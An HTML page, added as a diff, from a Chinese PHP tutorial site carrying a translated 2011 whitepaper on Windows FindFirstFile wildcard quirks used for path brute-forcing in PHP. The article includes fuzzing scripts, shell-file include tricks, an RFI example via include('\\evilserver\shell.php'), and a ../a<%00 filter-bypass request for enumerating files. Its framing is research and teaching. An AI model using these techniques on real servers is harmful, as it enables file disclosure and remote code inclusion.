@@ -1,0 +1,462 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimal-ui">
+    <title>windows文件系统机制引发的PHP路径爆破问题的深入分析_PHP教程_IDC笔记</title>
+    <meta name="keywords" content="PHP,PHP笔记,PHP教程" />
+    <meta name="description" content="这篇文章主要为大家详细介绍了windows文件系统机制引发的PHP路径爆破问题的深入分析，具有一定的参考价值，可以用来参考一下。" />
+    <meta content="Responsive admin theme build on top of Bootstrap 4" name="description" />
+    <meta content="idcnote.com" name="author" />
+    <link rel="shortcut icon" href="/skin1/images/favicon.ico">
+    <!--Morris Chart CSS -->
+    <link rel="stylesheet" href="/skin1/css/morris.css">
+    <link href="/skin1/css/bootstrap.min.css" rel="stylesheet" type="text/css">
+    <link href="/skin1/css/metismenu.min.css" rel="stylesheet" type="text/css">
+    <link href="/skin1/css/icons.css" rel="stylesheet" type="text/css">
+    <link href="/skin1/css/style.css" rel="stylesheet" type="text/css">
+<link href="/SyntaxHighlighter/shCoreDefault.css" rel="stylesheet" type="text/css" />
+<script type="text/javascript" src="/SyntaxHighlighter/shCore.js"></script>
+<script type="text/javascript">
+ SyntaxHighlighter.all();
+</script>
+<script>
+var paras = document.getElementsByTagName("pre");
+for ( var i=0;i<paras.length;i++ ) {
+    paras[i].setAttribute("class","brush:php;toolbar:false");     
+}
+</script>
+</head>
+<body>
+<!-- Begin page -->
+		<div id="wrapper">
+			<!-- Top Bar Start -->
+			<div class="topbar">
+				<!-- LOGO -->
+				<div class="topbar-left">
+					<a href="/" class="logo">
+						<span class="logo-light">
+                            <i class="mdi mdi-camera-control"></i>IDC笔记
+                        </span>
+						<span class="logo-sm">
+                            <i class="mdi mdi-camera-control"></i>
+                        </span>
+					</a>
+				</div>
+				<nav class="navbar-custom">
+					<ul class="navbar-right list-inline float-right mb-0">
+						<!--<li class="dropdown notification-list list-inline-item d-none d-md-inline-block">
+							<a class="nav-link waves-effect" href="#" id="btn-fullscreen">
+								<i class="mdi mdi-arrow-expand-all noti-icon"></i>
+							</a>
+						</li>
+						<li class="dropdown notification-list list-inline-item">
+							<div class="dropdown notification-list nav-pro-img">
+								<a class="dropdown-toggle nav-link arrow-none nav-user" data-toggle="dropdown" href="#" role="button" aria-haspopup="false" aria-expanded="false">
+									<img src="/skin1/picture/user-4.jpg" alt="user" class="rounded-circle">
+								</a>
+								<div class="dropdown-menu dropdown-menu-right profile-dropdown ">
+									<a class="dropdown-item" href="#">
+										<i class="mdi mdi-account-circle"></i> Profile</a>
+									<a class="dropdown-item" href="#">
+										<i class="mdi mdi-wallet"></i> Wallet</a>
+									<a class="dropdown-item d-block" href="#">
+										<span class="badge badge-success float-right">11</span>
+										<i class="mdi mdi-settings"></i> Settings</a>
+									<a class="dropdown-item" href="#">
+										<i class="mdi mdi-lock-open-outline"></i> Lock screen</a>
+									<div class="dropdown-divider"></div>
+									<a class="dropdown-item text-danger" href="#">
+										<i class="mdi mdi-power text-danger"></i> Logout</a>
+								</div>
+							</div>
+						</li>
+						-->
+					</ul>
+					<ul class="list-inline menu-left mb-0">
+						<li class="float-left">
+							<button class="button-menu-mobile open-left waves-effect">
+                            <i class="mdi mdi-menu"></i>
+                        </button>
+						</li>
+						<li class="d-none d-md-inline-block">
+							<form role="search" class="app-search">
+								<div class="form-group mb-0">
+									<input type="text" class="form-control" placeholder="Search..">
+									<button type="submit"><i class="fa fa-search"></i></button>
+								</div>
+							</form>
+						</li>
+					</ul>
+				</nav>
+			</div>
+<!-- ========== Left Sidebar Start ========== -->
+<div class="left side-menu">
+    <div class="slimscroll-menu" id="remove-scroll">
+    <!--- Sidemenu -->
+    <div id="sidebar-menu">
+    <!-- Left Menu Start -->
+    <ul class="metismenu" id="side-menu">
+			<li>
+		<a href="javascript:void(0);" class="waves-effect">
+			<i class="icon-share"></i>
+			<span> PHP简介			<span class="float-right menu-arrow">
+			<i class="mdi mdi-chevron-right"></i>
+			</span> 
+			</span>
+		</a>
+		<ul class="submenu">
+			 <li><a href="/php/jianjie/1.html">PHP简介</a></li><li><a href="/php/jianjie/2.html">PHP用途</a></li>		</ul>
+	</li>
+		<li>
+		<a href="javascript:void(0);" class="waves-effect">
+			<i class="icon-share"></i>
+			<span> PHP基本语法			<span class="float-right menu-arrow">
+			<i class="mdi mdi-chevron-right"></i>
+			</span> 
+			</span>
+		</a>
+		<ul class="submenu">
+			 <li><a href="/php/yufa/3.html">分离HTML</a></li><li><a href="/php/yufa/4.html">指令分隔符</a></li><li><a href="/php/yufa/5.html">PHP注释</a></li>		</ul>
+	</li>
+		<li>
+		<a href="javascript:void(0);" class="waves-effect">
+			<i class="icon-share"></i>
+			<span> PHP类型			<span class="float-right menu-arrow">
+			<i class="mdi mdi-chevron-right"></i>
+			</span> 
+			</span>
+		</a>
+		<ul class="submenu">
+			 <li><a href="/php/phpleixing/6.html">PHP类型简介</a></li><li><a href="/php/phpleixing/7.html">PHP类型之布尔类型</a></li><li><a href="/php/phpleixing/8.html">PHP类型之整型</a></li><li><a href="/php/phpleixing/9.html">PHP类型之浮点型</a></li><li><a href="/php/phpleixing/10.html">PHP类型之字符串</a></li><li><a href="/php/phpleixing/11.html">PHP类型之数组</a></li><li><a href="/php/phpleixing/12.html">PHP类型之对象</a></li><li><a href="/php/phpleixing/13.html">PHP类型之资源类型</a></li><li><a href="/php/phpleixing/14.html">PHP类型之NULL</a></li><li><a href="/php/phpleixing/15.html">PHP类型之伪类型</a></li><li><a href="/php/phpleixing/16.html">PHP类型之类型判别</a></li>		</ul>
+	</li>
+		<li>
+		<a href="javascript:void(0);" class="waves-effect">
+			<i class="icon-share"></i>
+			<span> PHP变量			<span class="float-right menu-arrow">
+			<i class="mdi mdi-chevron-right"></i>
+			</span> 
+			</span>
+		</a>
+		<ul class="submenu">
+			 <li><a href="/php/phpbianliang/17.html">PHP变量之基础</a></li><li><a href="/php/phpbianliang/18.html">PHP变量之预定义变量</a></li><li><a href="/php/phpbianliang/19.html">PHP变量之变量范围</a></li><li><a href="/php/phpbianliang/20.html">PHP变量之可变变量</a></li><li><a href="/php/phpbianliang/21.html">PHP变量之外部变量</a></li>		</ul>
+	</li>
+		<li>
+		<a href="javascript:void(0);" class="waves-effect">
+			<i class="icon-share"></i>
+			<span> PHP运算符			<span class="float-right menu-arrow">
+			<i class="mdi mdi-chevron-right"></i>
+			</span> 
+			</span>
+		</a>
+		<ul class="submenu">
+			 <li><a href="/php/yunsuanfu/22.html">PHP运算符优先级</a></li><li><a href="/php/yunsuanfu/23.html">算术运算符</a></li><li><a href="/php/yunsuanfu/24.html">赋值运算符</a></li><li><a href="/php/yunsuanfu/25.html">位运算符</a></li><li><a href="/php/yunsuanfu/26.html">比较运算符</a></li><li><a href="/php/yunsuanfu/27.html">错误控制运算符</a></li><li><a href="/php/yunsuanfu/28.html">执行运算符</a></li><li><a href="/php/yunsuanfu/29.html">递增/递减运算符</a></li><li><a href="/php/yunsuanfu/30.html">逻辑运算符</a></li><li><a href="/php/yunsuanfu/31.html">字符串运算符</a></li><li><a href="/php/yunsuanfu/32.html">数组运算符</a></li><li><a href="/php/yunsuanfu/33.html">类型运算符</a></li>		</ul>
+	</li>
+		<li>
+		<a href="javascript:void(0);" class="waves-effect">
+			<i class="icon-share"></i>
+			<span> PHP控制结构			<span class="float-right menu-arrow">
+			<i class="mdi mdi-chevron-right"></i>
+			</span> 
+			</span>
+		</a>
+		<ul class="submenu">
+			 <li><a href="/php/jiegou/34.html">PHP控制结构之if</a></li><li><a href="/php/jiegou/35.html">PHP控制结构之else</a></li><li><a href="/php/jiegou/36.html">PHP控制结构之elseif/else if</a></li><li><a href="/php/jiegou/37.html">PHP控制结构之替代语法</a></li><li><a href="/php/jiegou/38.html">PHP控制结构之while</a></li><li><a href="/php/jiegou/39.html">PHP控制结构之do-while</a></li><li><a href="/php/jiegou/40.html">PHP控制结构之for</a></li><li><a href="/php/jiegou/41.html">PHP控制结构之foreach</a></li><li><a href="/php/jiegou/42.html">PHP控制结构之break</a></li><li><a href="/php/jiegou/43.html">PHP控制结构之continue</a></li><li><a href="/php/jiegou/44.html">PHP控制结构之switch</a></li><li><a href="/php/jiegou/45.html">PHP控制结构之declare</a></li><li><a href="/php/jiegou/46.html">PHP控制结构之return</a></li><li><a href="/php/jiegou/47.html">PHP控制结构之require</a></li><li><a href="/php/jiegou/48.html">PHP控制结构之include</a></li>		</ul>
+	</li>
+		<li>
+		<a href="javascript:void(0);" class="waves-effect">
+			<i class="icon-share"></i>
+			<span> PHP函数			<span class="float-right menu-arrow">
+			<i class="mdi mdi-chevron-right"></i>
+			</span> 
+			</span>
+		</a>
+		<ul class="submenu">
+			 <li><a href="/php/hanshu/52.html">用户自定义函数</a></li><li><a href="/php/hanshu/53.html">函数的参数</a></li><li><a href="/php/hanshu/54.html">返回值</a></li><li><a href="/php/hanshu/55.html">可变函数</a></li><li><a href="/php/hanshu/56.html">内部（内置）函数</a></li><li><a href="/php/hanshu/57.html">匿名函数</a></li>		</ul>
+	</li>
+		<li>
+		<a href="javascript:void(0);" class="waves-effect">
+			<i class="icon-share"></i>
+			<span> PHP类与对象			<span class="float-right menu-arrow">
+			<i class="mdi mdi-chevron-right"></i>
+			</span> 
+			</span>
+		</a>
+		<ul class="submenu">
+			 <li><a href="/php/phpduixiang/58.html">类与对象前言</a></li><li><a href="/php/phpduixiang/59.html">基本概念</a></li><li><a href="/php/phpduixiang/60.html">属性</a></li><li><a href="/php/phpduixiang/61.html">类常量</a></li><li><a href="/php/phpduixiang/62.html">自动加载对象</a></li><li><a href="/php/phpduixiang/63.html">构造函数和析构函数</a></li><li><a href="/php/phpduixiang/64.html">访问控制</a></li><li><a href="/php/phpduixiang/65.html">对象继承</a></li><li><a href="/php/phpduixiang/66.html">Static关键字</a></li><li><a href="/php/phpduixiang/67.html">抽象类</a></li><li><a href="/php/phpduixiang/68.html">接口</a></li><li><a href="/php/phpduixiang/69.html">Traits</a></li><li><a href="/php/phpduixiang/70.html">重载</a></li><li><a href="/php/phpduixiang/71.html">对象迭代</a></li><li><a href="/php/phpduixiang/72.html">设计模式</a></li>		</ul>
+	</li>
+		<li>
+		<a href="javascript:void(0);" class="waves-effect">
+			<i class="icon-share"></i>
+			<span> PHP异常处理			<span class="float-right menu-arrow">
+			<i class="mdi mdi-chevron-right"></i>
+			</span> 
+			</span>
+		</a>
+		<ul class="submenu">
+			 <li><a href="/php/yichang/81.html">异常处理</a></li><li><a href="/php/yichang/82.html">扩展PHP内置的异常处理类</a></li>		</ul>
+	</li>
+		<li>
+		<a href="javascript:void(0);" class="waves-effect">
+			<i class="icon-share"></i>
+			<span> PHP函数库按分类			<span class="float-right menu-arrow">
+			<i class="mdi mdi-chevron-right"></i>
+			</span> 
+			</span>
+		</a>
+		<ul class="submenu">
+			 <li><a href="/php/phpku/83.html">数组</a></li><li><a href="/php/phpku/84.html">Classes/Objects</a></li><li><a href="/php/phpku/85.html">Date/Time</a></li><li><a href="/php/phpku/86.html">Directories</a></li><li><a href="/php/phpku/87.html">错误处理</a></li><li><a href="/php/phpku/88.html">Program execution</a></li><li><a href="/php/phpku/89.html">Filesystem</a></li><li><a href="/php/phpku/90.html">Filter</a></li><li><a href="/php/phpku/91.html">Function Handling</a></li><li><a href="/php/phpku/92.html">PHP 选项/信息</a></li><li><a href="/php/phpku/93.html">Mail</a></li><li><a href="/php/phpku/94.html">Math</a></li><li><a href="/php/phpku/95.html">Misc.</a></li><li><a href="/php/phpku/96.html">Network</a></li><li><a href="/php/phpku/97.html">输出控制</a></li>		</ul>
+	</li>
+		<li>
+		<a href="javascript:void(0);" class="waves-effect">
+			<i class="icon-share"></i>
+			<span> php基础			<span class="float-right menu-arrow">
+			<i class="mdi mdi-chevron-right"></i>
+			</span> 
+			</span>
+		</a>
+		<ul class="submenu">
+			 <li><a href="/php/phpbiji/108377.html"></a></li><li><a href="/php/phpbiji/108376.html"></a></li><li><a href="/php/phpbiji/108380.html"></a></li><li><a href="/php/phpbiji/108379.html"></a></li><li><a href="/php/phpbiji/108378.html"></a></li><li><a href="/php/phpbiji/108381.html"></a></li><li><a href="/php/phpbiji/108382.html"></a></li><li><a href="/php/phpbiji/108384.html"></a></li><li><a href="/php/phpbiji/108383.html"></a></li><li><a href="/php/phpbiji/108385.html"></a></li><li><a href="/php/phpbiji/108386.html"></a></li><li><a href="/php/phpbiji/108388.html"></a></li><li><a href="/php/phpbiji/108387.html"></a></li><li><a href="/php/phpbiji/108389.html"></a></li><li><a href="/php/phpbiji/108391.html"></a></li>		</ul>
+	</li>
+		<li>
+	    <a href="/php/biji/" class="waves-effect">
+		    <i class="icon-share"></i>
+		    <span>PHP笔记
+		       	<span class="float-right menu-arrow">
+		       	<i class="mdi mdi-chevron-right"></i>
+		       	</span>
+		    </span>
+	    </a>
+	</li>
+	</ul>
+</div>
+<!-- Sidebar -->
+<div class="clearfix"></div>
+</div>
+<!-- Sidebar -left -->
+</div>
+<!-- Left Sidebar End -->
+<!-- Start right Content here -->
+<div class="content-page">
+	<div class="content">
+		<div class="container-fluid">
+			<div class="page-title-box">
+				<div class="row align-items-center">
+					<div class="col-sm-6">
+						<h1 class="page-title">windows文件系统机制引发的PHP路径爆破问题的深入分析</h1>
+					</div>
+				</div>
+				<!-- end row -->
+			</div>
+			<!-- end page-title -->
+			<!-- START ROW -->
+			<div class="panel panel-forbid">
+				<div class="panel-title"><i class="fa fa fa-file-text fa-fw"></i>内容摘要</div>
+			    <div class="panel-content">
+			    <span>这篇文章主要为大家详细介绍了windows文件系统机制引发的PHP路径爆破问题的深入分析，具有一定的参考价值，可以用来参考一下。</span>                                     
+		    	</div>
+			    <div class="panel-title"><i class="fa fa fa-file-text fa-fw"></i>文章正文</div>
+			    <div class="panel-content">
+			    <span><p>这篇文章主要为大家详细介绍了windows文件系统机制引发的PHP路径爆破问题的深入分析，具有一定的参考价值，可以用来参考一下。</p>
+<p>1.开场白</p>
+<p>此次所披露的是以下网页中提出的问题所取得的测试结果：http://code.google.com/p/pasc2at/wiki/SimplifiedChinese</p>
+<p>代码如下：</p>
+<pre>
+<code>
+&lt;?php
+for ($i=0; $i&lt;255; $i++) {
+$url = &#39;1.ph&#39; . chr($i);
+$tmp = @file_get_contents($url);
+if (!empty($tmp)) echo chr($i) . &quot;\r\n&quot;;
+}
+?&gt;
+</code></pre>
+<p>windows的文件系统机制引发的PHP路径爆破问题分析</p>
+<p>已知1.php存在，以上脚本访问的结果是：</p>
+<p>代码如下：</p>
+<pre>
+<code>
+1.php
+1.phP
+1.ph&lt;
+1.ph&gt;
+</code></pre>
+<p>windows的文件系统机制引发的PHP路径爆破问题分析</p>
+<p>都能得到返回。前两种能返回结果是总所周知的（因为windows的文件系统支持大小的互转的机制），另外的两种返回引起了我们的注意。测试php版本：PHP4.9,PHP5.2,PHP5.3,PHP6.0测试系统：WINXP SP3 X32,WINXP SP2 X64，WIN7,WIN2K3经测试我们得出的结论是：该漏洞影响所有的windows+php版本</p>
+<p>2.深入探查模糊测试的结果</p>
+<p>为了继续深入探查关于该bug的信息，我们对demo做了些许修改:</p>
+<p>代码如下：</p>
+<pre>
+<code>
+&lt;?php
+for ($j=0; $i&lt;256; $j++) {
+for ($i=0; $i&lt;256; $i++) {
+$url = &#39;1.p&#39; . chr($j) . chr($i);
+$tmp = @file_get_contents($url);
+if (!empty($tmp)) echo chr($j) . chr($i) . &quot;\r\n&quot;;
+}
+}
+?&gt;
+</code></pre>
+<p>windows的文件系统机制引发的PHP路径爆破问题分析</p>
+<p>在调试php解释器的过程中，我们将此&ldquo;神奇&rdquo;的漏洞归结为一个Winapi 函数FindFirstFile(）所产生的结果(http://msdn.microsoft.com/en-us/library/aa364418(v=vs.85).aspx).更好玩的是，当跟踪函数调用栈的过程中我们发现字符&rdquo;&gt;&rdquo;被替换成&rdquo;?&rdquo;，字符&rdquo;&lt;&rdquo;被替换成&rdquo;*&rdquo;，而符号&rdquo;（双引号）被替换成一个&rdquo;.&rdquo;字符。这在2007年msdn公开的文档中被提及：http://msdn.microsoft.com/en-us/library/community/history/aa364418%28v=vs.85%29.aspx?id=3但是此bug至今未被任何windows旗下所发行的任何版本修复！我们要阐明的是，该函数FindFirstFile()在php下的运用远远不至于file_get_contents().关于该bug可以利用的函数我们已经列了如下一表：</p>
+<p><!---ecms -ecms 
+【图缺】
+-->此外，我们还发现该利用也可以被运用到c++中，以下采用来自msdn的例子：</p>
+<p>代码如下：</p>
+<pre>
+<code>
+#include &lt;windows.h&gt;
+#include &lt;tchar.h&gt;
+#include &lt;stdio.h&gt;
+void _tmain(int argc, TCHAR *argv[])
+{
+WIN32_FIND_DATA FindFileData;
+HANDLE hFind;
+if( argc != 2 )
+{
+_tprintf(TEXT(&quot;Usage: %s [target_file]\n&quot;), argv[0]);
+return;
+}
+_tprintf (TEXT(&quot;Target file is %s\n&quot;), argv[1]);
+hFind = FindFirstFile(argv[1], &amp;FindFileData);
+if (hFind == INVALID_HANDLE_VALUE)
+{
+printf (&quot;FindFirstFile failed (%d)\n&quot;, GetLastError());
+return;
+}
+else
+{
+_tprintf (TEXT(&quot;The first file found is %s\n&quot;),
+FindFileData.cFileName);
+FindClose(hFind);
+}
+}
+</code></pre>
+<p>windows的文件系统机制引发的PHP路径爆破问题分析</p>
+<p>当传入参数&rdquo;c:\bo&lt;&rdquo;时，成功访问到boot.ini文件。</p>
+<p>3.利用方法总结</p>
+<p>当调用FindFirstFile()函数时，&rdquo;&lt;&rdquo;被替换成&rdquo;*&rdquo;,这意味该规则可以使&rdquo;&lt;&rdquo;替换多个任意字符，但是测试中发现并不是所有情况都如我们所愿。所以，为了确保能够使&rdquo;&lt;&rdquo;被替换成&rdquo;*&rdquo;,应当采用&rdquo;&lt;&lt;&rdquo;EXAMPLE:include(&lsquo;shell&lt;&#39;); 或者include(&lsquo;shell&lt;&lt;&#39;); //当文件夹中超过一个以shell打头的文件时，该执行取按字母表排序后的第一个文件。当调用FindFirstFile()函数时，&rdquo;&gt;&rdquo;被替换成&rdquo;?&rdquo;,这意味这&rdquo;&gt;&rdquo;可以替换单个任意字符EXAMPLE：include(&lsquo;shell.p&gt;p&#39;); //当文件中超过一个以shell.p?p 通配时，该执行取按字母表排序后的第一个文件。当调用FindFirstFile()函数时，&rdquo;&rdquo;&rdquo;(双引号)被替换成&rdquo;.&rdquo;EXAMPLE:include(&lsquo;shell&rdquo;php&#39;); //===&gt;include(&lsquo;shell.php&#39;);如果文件名第一个字符是&rdquo;.&rdquo;的话，读取时可以忽略之EXAMPLE：fopen(&lsquo;.htacess&#39;); //==&gt;fopen(&lsquo;htacess&#39;); //加上第一点中的利用 ==&gt;fopen(&lsquo;h&lt;&lt;&#39;);文件名末尾可以加上一系列的/或者\的合集，你也可以在/或者\中间加上.字符，只要确保最后一位为&rdquo;.&rdquo;EXAMPLE：fopen(&ldquo;config.ini\\.// \/\/\/.&rdquo;);==&gt; fopen(&lsquo;config.ini\./.\.&#39;); ==&gt;fopen(&lsquo;config.ini/////.&#39;)==&gt;fopen(&lsquo;config.ini&hellip;..&#39;) //译者注：此处的利用我不是很理解，有何作用？截断？该函数也可以调用以&rdquo;\\&rdquo;打头的网络共享文件，当然这会耗费不短的时间。补充一点，如果共享名不存在时，该文件操作将会额外耗费4秒钟的时间，并可能触发时间响应机制以及max_execution_time抛错。所幸的是，该利用可以用来绕过allow_url_fopen=Off 并最终导致一个RFI（远程文件包含）EXAMPLE：include (&lsquo;\\evilserver\shell.php&#39;);用以下方法还可以切换文件的盘名include(&lsquo;\\.\C:\my\file.php\..\..\..\D:\anotherfile.php&#39;);选择磁盘命名语法可以用来绕过斜线字符过滤file_get_contents(&lsquo;C:boot.ini&#39;); //==&gt; file_get_contents (&lsquo;C:/boot.ini&#39;);在php的命令行环境下（php.exe）,关于系统保留名文件的利用细节EXAMPLE:file_get_contents(&lsquo;C:/tmp/con.jpg&#39;); //此举将会无休无止地从CON设备读取0字节，直到遇到eofEXAMPLE:file_put_contents(&lsquo;C:/tmp/con.jpg&#39;,chr(0&times;07)); //此举将会不断地使服务器发出类似哔哔的声音</p>
+<p>4.更深入的利用方法</p>
+<p>除了以上已经展示的方法，你可以用下面的姿势来绕过WAF或者文件名过滤请思考该例：</p>
+<p>代码如下：</p>
+<pre>
+<code>
+&lt;?php
+file_get_contents(&quot;/images/&quot;.$_GET[&#39;a&#39;].&quot;.jpg&quot;);
+//or another function from Table 1, i.e. include().
+?&gt;
+</code></pre>
+<p>windows的文件系统机制引发的PHP路径爆破问题分析</p>
+<p>访问test.php?a=../a&lt;%00可能出现两种结果</p>
+<p>代码如下：</p>
+<pre>
+<code>
+Warning: include(/images/../a&lt;) [function.include]: failed to open stream:Invalid argument in。。。
+Warning: include(/images/../a&lt;) [function.include]: failed to open stream:Permission denied。。
+</code></pre>
+<p>windows的文件系统机制引发的PHP路径爆破问题分析</p>
+<p>如果是第一种情况，说明不存在a打头的文件，第二种则存在。此外，有记录显示，有时网站会抛出如下错误：</p>
+<p>代码如下：</p>
+<pre>
+<code>
+Warning: include(/admin_h1d3) [function.include]: failed to open stream: Permission denied..
+</code></pre>
+<p>windows的文件系统机制引发的PHP路径爆破问题分析</p>
+<p>这说明该文件夹下存在一个以上以a打头的文件（夹），并且第一个就是admin_h1d3。</p>
+<p>5.结论实验告诉我们，php本身没有那么多的漏洞，我们所看到是：过分的依赖于另一种程序语言（注：如文中的漏洞产自与winapi的一个BUG），并且直接强 制使用，将会导致细微的错误(bug)，并最终造成危害(vul).这样便拓宽了模糊测试的范畴（译者注：并不仅仅去研究web层面，而深入到系统底层），并最终导致IDS，IPS的规则更新。诚然，代码需要保护，需要补丁，需要升级与扩充。但是，这并不是我们真正要去关注的问题。在当下，我认为我们 更谨慎地去书写更多更严厉的过滤规则，正如我们一直在做的一样。任重道远，精益求精。因为这是基础应用层的问题，所以我们猜想类似的问题可能出现在其他web应用中。于是我们还测试了mysql5,而实验结果表明，mysql5并不存在类似的漏洞。但是我们仍认为：类似的漏洞将会出现在诸如Perl、Python、Ruby等解释性语言上。</p>
+<p>6.Referer</p>
+<p>代码如下：</p>
+<pre>
+<code>
+PHP application source code audits advanced technology:
+http://code.google.com/p/pasc2at/wiki/SimplifiedChinese
+MSDN FindFirstFile Function reference:
+http://msdn.microsoft.com/en-us/library/aa364418(v=vs.85).aspx
+MSDN comments history:
+http://msdn.microsoft.com/en-us/library/community/history/aa364418(v=vs.85).aspx?id=3
+MSDN article &laquo;Naming Files, Paths, and Namespaces&raquo;:
+http://msdn.microsoft.com/en-us/library/aa365247(v=vs.85).aspx
+Technet article &laquo;Managing Files and Directories&raquo;:
+http://technet.microsoft.com/en-us/library/cc722482.aspx
+Paper &laquo;Technique of quick exploitation of 2blind SQL Injection&raquo;:
+http://www.exploit-db.com/papers/13696/
+</code></pre>
+<p>windows的文件系统机制引发的PHP路径爆破问题分析</p>
+<p>==================================================================全文完。注：该文是2011年底发表的一篇白皮书，至今该bug依然存在。我在几个月前做CUIT的一个CTF时偶遇了一道该bug的利用，当时便是看的此文，当时只是粗粗读了一下，写了一个php的脚本去跑目录。今回闲来无事，翻译整理了一番。</p>
+<p>注：关于windows文件系统机制引发的PHP路径爆破问题的深入分析的内容就先介绍到这里，更多相关文章的可以留意</p></span>                                     
+		    	</div>
+		    	<div class="panel-title"><i class="fa fa fa-file-text fa-fw"></i>代码注释</div>
+			    <div class="panel-content">
+			    <span></span>                                     
+		    	</div>
+
+			</div>
+
+			<!-- END ROW -->
+			<div class="newsPage">
+				<div class="newsPageTurn">
+				    <span><a>上一篇</a><a href='/php/phpbiji/108881.html'>Python之Matlab制作一款真正的拼图小游戏的解决办法</a><a>下一篇</a><a href='/php/phpbiji/'>返回列表</a></span>
+				</div>
+			</div>
+		</div>
+
+
+<div id="author-box">
+    <h3>作者：喵哥笔记</h3>
+        <div class="author-info">
+            <div class="author-avatar">
+                <img src="/skin1/picture/01.jpg" alt="IDC笔记" class="avatar" width="64" height="64">
+            </div>
+        <div class="author-description">
+            <p>学的不仅是技术，更是梦想！</p>
+            <ul class="author-social follows nb">
+            	<li>
+                    <a target="_blank" href="/" title="IDC笔记">IDC笔记</a>
+                </li>
+            </ul>
+        </div>
+        <div class="clear"></div>
+    </div>
+</div>
+<script>
+var paras = document.getElementsByTagName("pre");
+for ( var i=0;i<paras.length;i++ ) {
+    paras[i].setAttribute("class","brush:php;toolbar:false");     
+}
+</script>
+<!-- container-fluid -->
+	</div>
+<!-- content -->
+	<footer class="footer">
+	© 2020 IDC笔记 <i class="mdi mdi-heart text-danger"></i>. | 备案号：<a href="https://beian.miit.gov.cn/">辽ICP备18000516号</a>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?674585fbbd2294d3faf910f668ea91b4";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+	</footer>
+</div>
+
+</div>
+<!-- END wrapper -->
+<!-- jQuery  -->
+<script src="/skin1/js/jquery.min.js"></script>
+<script src="/skin1/js/bootstrap.bundle.min.js"></script>
+<script src="/skin1/js/metismenu.min.js"></script>
+<script src="/skin1/js/jquery.slimscroll.js"></script>
+<script src="/skin1/js/waves.min.js"></script>
+<!--Morris Chart-->
+<script src="/skin1/js/morris.min.js"></script>
+<script src="/skin1/js/raphael.min.js"></script>
+<script src="/skin1/js/dashboard.init.js"></script>
+<script src="/skin1/js/app.js"></script>
+<script src="/foot.js"></script>
+</body>
+</html>
